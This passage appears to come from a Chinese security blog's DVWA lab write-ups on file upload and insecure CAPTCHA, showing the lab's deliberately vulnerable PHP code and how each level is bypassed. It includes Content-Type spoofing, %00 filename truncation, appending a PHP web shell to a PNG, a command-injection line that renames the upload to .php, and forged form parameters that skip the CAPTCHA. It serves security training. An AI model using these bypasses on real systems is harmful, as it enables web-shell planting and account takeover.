class="variable">$target_path</span> ) ) {</span><br><span class="line">                <span class="comment">// No</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// Yes!</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Invalid file</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>Medium的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过 100000B（约为 97.6KB）；</p>
<p>BurpSuite抓包，更改content-type即可；</p>
<h2 id="攻击测试-1"><a href="#攻击测试-1" class="headerlink" title="攻击测试"></a>攻击测试</h2><ol>
<li><p>上传LOW的php文件，显示上传失败；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121151205.png"></p>
</li>
<li><p>BurpSuite抓包，将Content-Type改为image/png，重新发包，文件上传成功，可以使用蚁剑连接；<br> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121155807.png"></p>
</li>
<li><p>也可以通过**<code>%00</code>截断上传绕过**，</p>
<p> 在php版本小于 <strong>5.3.4</strong> 的服务器中，当<code>magic_quote_gpc=off</code>时，可以在文件名中使用<code>%00</code>截断，可以把上传文件命名为<code>shell.php%00.png</code></p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121160217.png"></p>
</li>
</ol>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">        <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">        <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line">        <span class="comment">// File information</span></span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">        <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">        <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line">        <span class="comment">// Is it an image?</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpg"</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpeg"</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">            ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">            <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) {</span><br><span class="line">            <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">            <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) {</span><br><span class="line">                <span class="comment">// No</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// Yes!</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Invalid file</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li><p>strrpos()函数</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrpos</span>(<span class="keyword">string</span>,find,start)</span><br></pre></td></tr></table></figure>

<p>  函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索</p>
</li>
<li><p>strtolower()函数：</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strtolower</span>(<span class="keyword">string</span>)</span><br></pre></td></tr></table></figure>

<p>  把字符串转换为小写</p>
</li>
<li><p>getimagesize()函数</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getimagesize</span>(<span class="keyword">string</span> filename)</span><br></pre></td></tr></table></figure>

<p>  getimagesize()函数用于获取图像大小及相关信息，成功则返回一个数组，失败则返回FALSE并产生一条E_WARNING级的错误信息</p>
</li>
</ul>
<p>限制：</p>
<ul>
<li>  读取文件名中最后一个<code>.</code>后的字符串，通过文件名来限制文件类型因此要求上传文件名形式必须是*.jpg、*.jpeg 、*.png三者之一；</li>
<li>  getimagesize()函数限制了上传文件的文件头必须为图像类型；</li>
</ul>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>绕过getimagesize()函数，可以使用如下命令，将php嵌入到图片里面，上传图片</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line"><span class="built_in">cat</span> shell.php &gt;&gt; shell.png</span><br><span class="line"><span class="comment"># windows</span></span><br><span class="line">copy shell.png/b + shell.php/a new.png</span><br></pre></td></tr></table></figure>

<p>由于是png文件，此时用蚁剑还无法连接，需要借助HIGH级别的文件包含漏洞；</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">127.0.0.1|mv ../../hackable/uploads/shell.png ../../hackable/uploads/shell.php</span><br></pre></td></tr></table></figure>

<p>再进行蚁剑连接即可；</p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if( isset( $_POST[ 'Upload' ] ) ) {</span><br><span class="line">        // Check Anti-CSRF token</span><br><span class="line">        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );</span><br><span class="line">        // File information</span><br><span class="line">        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];</span><br><span class="line">        $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);</span><br><span class="line">        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];</span><br><span class="line">        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];</span><br><span class="line">        $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];</span><br><span class="line">        // Where are we going to be writing to?</span><br><span class="line">        $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';</span><br><span class="line">        //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span><br><span class="line">        $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;</span><br><span class="line">        $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );</span><br><span class="line">        $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;</span><br><span class="line">        // Is it an image?</span><br><span class="line">        if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp;</span><br><span class="line">            ( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">            ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp;</span><br><span class="line">            getimagesize( $uploaded_tmp ) ) {</span><br><span class="line">            // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br><span class="line">            if( $uploaded_type == 'image/jpeg' ) {</span><br><span class="line">                $img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">                imagejpeg( $img, $temp_file, 100);</span><br><span class="line">            }</span><br><span class="line">            else {</span><br><span class="line">                $img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">                imagepng( $img, $temp_file, 9);</span><br><span class="line">            }</span><br><span class="line">            imagedestroy( $img );</span><br><span class="line">            // Can we move the file to the web root from the temp folder?</span><br><span class="line">            if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {</span><br><span class="line">                // Yes!</span><br><span class="line">                echo "&lt;pre&gt;&lt;a href='${target_path}${target_file}'&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;";</span><br><span class="line">            }</span><br><span class="line">            else {</span><br><span class="line">                // No</span><br><span class="line">                echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';</span><br><span class="line">            }</span><br><span class="line">            // Delete any temp files</span><br><span class="line">            if( file_exists( $temp_file ) )</span><br><span class="line">                unlink( $temp_file );</span><br><span class="line">        }</span><br><span class="line">        else {</span><br><span class="line">            // Invalid file</span><br><span class="line">            echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    // Generate Anti-CSRF token</span><br><span class="line">    generateSessionToken();</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li>  使用 <code>imagecreatefromjpeg</code> 或 <code>imagecreatefrompng</code> 去掉了不属于图片的部分；</li>
<li>  将文件重命名为随机字符串；</li>
<li>  增加Anti-Token防止CSRF攻击；</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121164229.png"></p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>File Upload</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA Insecure CAPTCHA</title>
    <url>/DVWA-Insecure-CAPTCHA.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Insecure CAPTCHA，不安全的验证码，主要是开发者验证流程，代码出现逻辑漏洞，并非谷歌验证码有漏洞。<span id="more"></span></p>
<p>验证码作用就是防止攻击者使用工具自动调用系统功能，防止恶意软件、机器人批操作，如注册、登录功能。对于Brute Force字典暴力破解，严密的验证码机制可以避免使用工具大量尝试登录。</p>
<h2 id="reCAPTCHA验证流程"><a href="#reCAPTCHA验证流程" class="headerlink" title="reCAPTCHA验证流程"></a>reCAPTCHA验证流程</h2><p>reCAPTCHA服务验证的具体流程如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121181011.png"></p>
<p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">recaptcha_check_answer</span>(<span class="variable">$privkey</span>,<span class="variable">$remoteip</span>, <span class="variable">$challenge</span>,<span class="variable">$response</span>)</span><br></pre></td></tr></table></figure>

<p>参数<code>$privkey</code>是服务器申请的private key，<code>$remoteip</code>是用户的ip，<code>$challenge</code>是recaptcha_challenge_field 字段的值，来自前端页面 ，<code>$response</code>是g-recaptcha-response字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</p>
<ul>
<li>  <code>$is_valid</code>是布尔型的，表示校验是否有效；</li>
<li>  <code>$error</code>是返回的错误代码；</li>
</ul>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Change'</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) {</span><br><span class="line">        <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">        <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">            <span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_private_key'</span>],</span><br><span class="line">            <span class="variable">$_POST</span>[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="variable">$resp</span> ) {</span><br><span class="line">            <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) {</span><br><span class="line">                <span class="comment">// Show next stage for the user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                    &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                    &lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"hidden\" name=\"password_new\" value=\"<span class="subst">{$pass_new}</span>\" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"hidden\" name=\"password_conf\" value=\"<span class="subst">{$pass_conf}</span>\" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">                <span class="variable">$html</span>     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">                <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Change'</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) {</span><br><span class="line">        <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Check to see if both password match</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) {</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="comment">// Update database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="subst">$pass_new</span>' WHERE user = '"</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">"';"</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>第一步检查用户输入的验证码，验证通过后，服务器返回表单；</p>
<p>第二步客户端提交post请求，服务器完成更改密码的操作；</p>
<p>这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
<h2 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h2><p>根据后端代码，可以使用BurpSuite抓包，然后更改step参数为2，可以更改密码；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121182919.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Change'</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) {</span><br><span class="line">        <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">        <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">            <span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">            <span class="variable">$_POST</span>[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="variable">$resp</span> ) {</span><br><span class="line">            <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) {</span><br><span class="line">                <span class="comment">// Show next stage for the user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                    &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                    &lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"hidden\" name=\"password_new\" value=\"<span class="subst">{$pass_new}</span>\" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"hidden\" name=\"password_conf\" value=\"<span class="subst">{$pass_conf}</span>\" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">                <span class="variable">$html</span>     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">                <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Change'</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) {</span><br><span class="line">        <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">'passed_captcha'</span> ] ) {</span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Check to see if both password match</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) {</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="comment">// Update database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="subst">$pass_new</span>' WHERE user = '"</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">"';"</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">            <span class="comment">// Feedback for the end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>第二步验证时，参加了对参数<code>passed_captcha</code>的检查，如果参数值为true，则认为用户已经通过了验证码检查。</p>
<p>依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。</p>
<h2 id="攻击测试-1"><a href="#攻击测试-1" class="headerlink" title="攻击测试"></a>攻击测试</h2><p>依旧抓包更改，除了更改step为2，还需添加passed_captcha为true；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201121183852.png"></p>
